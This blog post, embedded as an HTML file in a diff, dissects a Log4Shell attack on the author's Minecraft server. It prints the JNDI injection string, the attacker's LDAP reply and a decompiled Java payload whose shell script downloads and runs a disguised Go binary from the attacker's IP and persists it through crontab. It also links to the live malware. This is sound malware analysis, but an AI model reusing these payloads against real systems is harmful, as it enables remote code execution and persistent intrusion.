@@ -1,0 +1,113 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Dissecting a Log4Shell Attack</title><meta property="og:title" content="Dissecting a Log4Shell Attack"><meta property="og:type" content="website"><meta property="og:description" content="Ever since the beginning, Log4Shell has been inseperably tied to Minecraft servers. In this post, I take apart one such attack and see what makes it tick."><meta name="description" content="Ever since the beginning, Log4Shell has been inseperably tied to Minecraft servers. In this post, I take apart one such attack and see what makes it tick."><link rel="canonical" href="https://blog.bithole.dev/log4shell-mc.html"><link rel="stylesheet" href="static/stylesheets/main.css"><link rel="stylesheet" href="static/stylesheets/highlight-style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css"></head><body><a href="/"><img src="static/images/banner0.jpg" alt="blog banner"></a><p id="date" class="date">January 13, 2022</p><h1 style="margin-top: 0">Dissecting a Log4Shell Attack</h1><p>In case you haven&#39;t heard, there&#39;s been a bit of an illness going around. No, not COVID. I&#39;m talking about <a href="https://en.wikipedia.org/wiki/Log4Shell">Log4Shell</a>, possibly one of the worst zero-day vulnerabilities in the history of cybersecurity. It is endemic to Log4j2, probably the most popular logging framework for modern Java, which powers thousands of applications (including Minecraft). The power of Log4Shell cannot be understated; if a vulnerable server simply logs a specific string, remote code execution may be possible.</p>
+<p>Today I checked the Discord server for my SMP, and was greeted with a rather unexpected surprsie:</p>
+<p><a href="static/images/log4shell-bitcraft.png" target="_blank"><img src="static/images/log4shell-bitcraft.png" alt="pic from my discord"></a></p>
+<p><em>This lovely Discord-Minecraft bridge is powered by <a href="https://github.com/adrian154/minelink">Minelink</a>.</em></p>
+<p>This is a pretty stock-standard attempt to exploit Log4Shell, which I have thankfully patched my server against. Essentially, Log4J provides a functionality called <em>message lookup substitution</em>; essentially, when you log a message using Log4J, it looks for segments enclosed in <code>${ }</code> and replaces those segments with a dynamically retrieved value. One of the systems which Log4j can use to retrieve data is the <a href="https://en.wikipedia.org/wiki/Java_Naming_and_Directory_Interface">Java Naming and Directory Interface</a>, whose purpose is to essentially allow applications to look up information given a short, portable name. Now, the really terrifying part is that JNDI may contact an <a href="https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol">LDAP</a> server, which returns a response serialized as a Java class. The value of that response is extracted by <strong>executing the class</strong>. And in just three easy steps, you&#39;ve got remote code execution!</p>
+<p>Interestingly enough, attacks like this have been known about <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">since 2016</a>. It wasn&#39;t until December 4th, 2021, when Log4j&#39;s maintainer (<a href="https://www.ralphgoers.com/">Ralph Goers</a>) submitted a patch to the project&#39;s repository to restrict the protocols that lookups could access, that the world realized that half of all Java applications had just become a ticking time bomb.</p>
+<p>Tracing the timeline of this exploit yields some fascinating discussion, but let&#39;s get back to our bad actor from earlier, shall we?</p>
+<p>The attack arrived this morning at 4:53 AM UTC. Here&#39;s what it looked like in the console:</p>
+<pre><code class="hljs"><span class="hljs-selector-attr">[4:53:39 AM]</span> <span class="hljs-selector-attr">[INFO]</span> UUID of player FermatSleep is <span class="hljs-number">9</span>abd3b4d-a8cd-<span class="hljs-number">4290</span>-acc5-<span class="hljs-number">303</span>c74da3e3f
+<span class="hljs-selector-attr">[4:53:39 AM]</span> <span class="hljs-selector-attr">[INFO]</span> FermatSleep<span class="hljs-selector-attr">[/195.154.52.77:51192]</span> logged in with entity id <span class="hljs-number">1092165</span> at (<span class="hljs-selector-attr">[world]</span><span class="hljs-number">114.5</span>, <span class="hljs-number">72.0</span>, -<span class="hljs-number">37.5</span>)
+<span class="hljs-selector-attr">[4:53:41 AM]</span> <span class="hljs-selector-attr">[INFO]</span> FermatSleep: ${jndi:ldap://<span class="hljs-number">195.154</span>.<span class="hljs-number">52.77</span>:<span class="hljs-number">1389</span>/a}
+<span class="hljs-selector-attr">[4:53:43 AM]</span> <span class="hljs-selector-attr">[INFO]</span> FermatSleep lost connection: Disconnected</code></pre><p>A quick IP-to-ASN lookup reveals that the attack was launched from a server belonging to AS12876, one of <a href="https://www.scaleway.com/en/">Scaleway</a>&#39;s servers. We can use <a href="https://github.com/bindle/ldap-utils">ldapsearch</a> to simulate the request that this message would trigger on a vulnerable server.</p>
+<pre><code class="hljs">$ ldapsearch -x -H ldap://195.154.52.77:1389/a
+<span class="hljs-comment"># extended LDIF</span>
+<span class="hljs-comment">#</span>
+<span class="hljs-comment"># LDAPv3</span>
+<span class="hljs-comment"># base &lt;&gt; (default) with scope subtree</span>
+<span class="hljs-comment"># filter: (objectclass=*)</span>
+<span class="hljs-comment"># requesting: ALL</span>
+<span class="hljs-comment">#</span>
+
+<span class="hljs-comment">#</span>
+<span class="hljs-attribute">dn</span>:
+<span class="hljs-attribute">javaClassName</span>: foo
+<span class="hljs-attribute">javaCodeBase</span>: http://195.154.52.77:8000/
+<span class="hljs-attribute">objectClass</span>: javaNamingReference
+<span class="hljs-attribute">javaFactory</span>: Exploit
+
+<span class="hljs-comment"># search result</span>
+<span class="hljs-attribute">search</span>: 2
+<span class="hljs-attribute">result</span>: 0 Success
+
+<span class="hljs-comment"># numResponses: 2</span>
+<span class="hljs-comment"># numEntries: 1</span></code></pre><p>Essentially, this reply says that to retrieve the requested value, the client should download <code>Exploit.class</code> from <code>http://195.154.52.77:8000/</code> and execute it. (Not very subtle, is it.) Well, downloading the decompiling the class yields its source code:</p>
+<pre><code class="hljs"><span class="hljs-comment">/* Decompiler 14ms, total 275ms, lines 67 */</span>
+<span class="hljs-keyword">import</span> java.io.IOException;
+<span class="hljs-keyword">import</span> java.io.InputStream;
+<span class="hljs-keyword">import</span> java.util.Scanner;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span> {
+   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">script</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;url=http://195.154.52.77:8000/mc_server.jar;remote_ip=195.154.52.77;port=$(wget -O- http://$remote_ip:8000/port 2&gt;/dev/null) ;[ $? -ne 0 ] &amp;&amp; port=$(curl http://$remote_ip:8000/port 2&gt;/dev/null) ;wget --no-check-certificate $url &gt; /dev/null 2&gt;&amp;1 || curl -k -O $url &gt; /dev/null 2&gt;&amp;1 ;chmod +x ./mc_server.jar;nohup ./mc_server.jar -b $port &gt; /dev/null 2&gt;&amp;1 &amp;cmd=\&quot;$(pwd)/mc_server.jar -b $port\&quot;;(crontab -l ;  echo \&quot;@reboot $cmd\&quot; ) | sort - | uniq - | crontab - ;echo done ;&quot;</span>;
+
+   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">execCmd</span><span class="hljs-params">(String var0)</span> {
+      <span class="hljs-type">String</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
+      String[] var2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]{<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, var0};
+
+      <span class="hljs-keyword">try</span> {
+         <span class="hljs-type">InputStream</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(var2).getInputStream();
+         <span class="hljs-type">Throwable</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
+
+         <span class="hljs-keyword">try</span> {
+            <span class="hljs-type">Scanner</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(var3)).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);
+            <span class="hljs-type">Throwable</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
+
+            <span class="hljs-keyword">try</span> {
+               var1 = var5.hasNext() ? var5.next() : <span class="hljs-literal">null</span>;
+            } <span class="hljs-keyword">catch</span> (Throwable var31) {
+               var6 = var31;
+               <span class="hljs-keyword">throw</span> var31;
+            } <span class="hljs-keyword">finally</span> {
+               <span class="hljs-keyword">if</span> (var5 != <span class="hljs-literal">null</span>) {
+                  <span class="hljs-keyword">if</span> (var6 != <span class="hljs-literal">null</span>) {
+                     <span class="hljs-keyword">try</span> {
+                        var5.close();
+                     } <span class="hljs-keyword">catch</span> (Throwable var30) {
+                        var6.addSuppressed(var30);
+                     }
+                  } <span class="hljs-keyword">else</span> {
+                     var5.close();
+                  }
+               }
+
+            }
+         } <span class="hljs-keyword">catch</span> (Throwable var33) {
+            var4 = var33;
+            <span class="hljs-keyword">throw</span> var33;
+         } <span class="hljs-keyword">finally</span> {
+            <span class="hljs-keyword">if</span> (var3 != <span class="hljs-literal">null</span>) {
+               <span class="hljs-keyword">if</span> (var4 != <span class="hljs-literal">null</span>) {
+                  <span class="hljs-keyword">try</span> {
+                     var3.close();
+                  } <span class="hljs-keyword">catch</span> (Throwable var29) {
+                     var4.addSuppressed(var29);
+                  }
+               } <span class="hljs-keyword">else</span> {
+                  var3.close();
+               }
+            }
+
+         }
+      } <span class="hljs-keyword">catch</span> (IOException var35) {
+         var35.printStackTrace();
+      }
+
+      <span class="hljs-keyword">return</span> var1;
+   }
+
+   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Exploit</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
+      execCmd(script);
+   }
+}</code></pre><p><em>Decompiled using <a href="https://jdec.app">jdec.app</a>, go check it out!</em></p>
+<p>Essentially, this payload tries to execute some commands on the target machine:</p>
+<pre><code class="hljs">url=http://195.154.52.77:8000/mc_server.jar;remote_ip=195.154.52.77;
+port=$(wget -O- http://<span class="hljs-variable">$remote_ip</span>:8000/port 2&gt;/dev/null) ;[ $? -ne 0 ] &amp;&amp; port=$(curl http://<span class="hljs-variable">$remote_ip</span>:8000/port 2&gt;/dev/null) ;
+wget --no-check-certificate <span class="hljs-variable">$url</span> &gt; /dev/null 2&gt;&amp;1 || curl -k -O <span class="hljs-variable">$url</span> &gt; /dev/null 2&gt;&amp;1 ;
+<span class="hljs-built_in">chmod</span> +x ./mc_server.jar;
+<span class="hljs-built_in">nohup</span> ./mc_server.jar -b <span class="hljs-variable">$port</span> &gt; /dev/null 2&gt;&amp;1 &amp;cmd=\&quot;$(<span class="hljs-built_in">pwd</span>)/mc_server.jar -b <span class="hljs-variable">$port</span>\&quot;;(crontab -l ;  <span class="hljs-built_in">echo</span> \&quot;@reboot <span class="hljs-variable">$cmd</span>\&quot; ) | <span class="hljs-built_in">sort</span> - | <span class="hljs-built_in">uniq</span> - | crontab - ;<span class="hljs-built_in">echo</span> <span class="hljs-keyword">done</span> ;</code></pre><p>Needless to say, this is not how you run a Minecraft server. The script downloads a binary payload and then dynamically retrieves which port to phone home on from an endpoint called <code>http://195.154.52.77:8000/port</code>, which at the time of writing is 31463. (Looking at the headers set on the response from that endpoint also revealed that the server is powered by <a href="https://github.com/bitly/simplehttp">simplehttp</a> 0.6, running on Python 3.8.10). This port is then passed to the payload, which is saved to a file called &quot;mc_server.jar&quot; to avoid arousing suspicion but is actually written in Go.</p>
+<pre><code class="hljs">$ <span class="hljs-keyword">file</span> mc_server.jar
+mc_server.jar: ELF <span class="hljs-number">64</span>-bit LSB executable, x86-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), statically linked, Go BuildID=ojJR3xcBkteWK4xWptDc<span class="hljs-regexp">/hF_tAQVMNfAbpoZ4Kkik/</span><span class="hljs-number">2</span>jwNMERfF4KTuAdVK_0q/BkcBVr6Mnr8QyxLTfPDi, stripped</code></pre><p>Running <code>strings</code> on the payload also reveals a wealth of interesting information, such as the name of the malware author and his RSA pubkey.</p>
+<pre><code class="hljs">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDOjnUF<span class="hljs-regexp">/J249WuSeaDSlEnOeP1n/</span><span class="hljs-number">75</span>iHQxRK8xjuB1J0FWTATtZcmBjtsGFX6nvv0vkS3kkhp7+Ba+B0GurEK+hdsPYvqMAPydq02iuPojsKOrDuVaPAox+kbmNTR3NEZ<span class="hljs-regexp">/rfd7OYzYNoK+mA/</span>wqJl8K5+BaxUlXbNkKaO5IUbKP2XxLHz4IxRfNEAtl1iscTi0ckdrs4ZNK+PSKE+<span class="hljs-regexp">/Q0seOicuTlkRViP+M1G67mOi9Q12khrRlXwR0nsYuNFc73jWNH2oKoCllUqPHcHsfspvFZ56XzgTx3tZG1L57kfQCF6ErpbTyG8C0ov0rNm7fbcH8sRjYglnA1qc8mV1gVPc8VOZZp+0vvaA+Kv2ZEmMSbhyORC/</span>HM8uCYGbZ8oW1jxZKaSpVasVT8UsbR5bHKM67xXsgZrIvXLGzIDu7QAe3VL1rm7MMe25K10kSkWi6ZuH1UVSuNw+y75igRxOHIox9PElUvVnVTEgIpHTjirY0g<span class="hljs-regexp">/PNmaQ6BlPuRvRFJF3SIKOy5gsZbATj7jhhI5Hj3LvioRwgYe1f0rnn0/</span>Yx7r9tAq5edVk9rkLCUcWh8lbGoZ4Vr<span class="hljs-regexp">/qTYMn4dMPCr78oQ3nX/</span>W6PuDdH8Dxmulq9alrotNcGaznnxnaOixZOCaRKbrMGLje+tXMTSvIJ8aN7Z+puvkIBE4fxMBt2GznN9Whg0Q== rafael@rafael-acer</code></pre><p>Rafael, you sly dog! If you had used C, I might respect you a little more. Scrolling through the absolutely enormous output reminds me that golang still lacks a functional tree shaker, or at least it&#39;s not doing its job. The numerous mentions to <code>ssh</code> suggest that the binary establishes a reverse shell so that Mr. Rafael here can log into your server to further pursue his shenanigans. </p>
+<p>I&#39;ve set up a VM to further investigate what Rafael is up to with his attacks. In the meantime, <a href="static/log4shell-payload.bin">here</a> is a link to download the payload if you would like to look at it for yourself, though obviously don&#39;t be stupid with it since it&#39;s live malware. Until next time!</p>
+<h1 id="further-reading">Further Reading <a class="section-link" href="#further-reading">&sect;</a></h1><p>If you enjoyed this blogpost, please go checkout the <a href="https://www.lunasec.io/docs/blog/log4j-zero-day/">LunaSec</a> article on Log4Shell, which inspired this journey and made it possible.</p>
+<script src="https://utteranc.es/client.js" crossorigin="anonymous" repo="adrian154/blog" issue-term="title" label="blog-post-comments" theme="github-light"></script><p class="footnote">&copy; 2022 Adrian Zhang &bull; <a href="https://bithole.dev/">about me</a> &bull; <a href="https://github.com/adrian154/blog">contribute &bull; <a href="https://creativecommons.org/licenses/by-sa/3.0/legalcode">CC BY-SA 3.0</a></a></p></body></html>
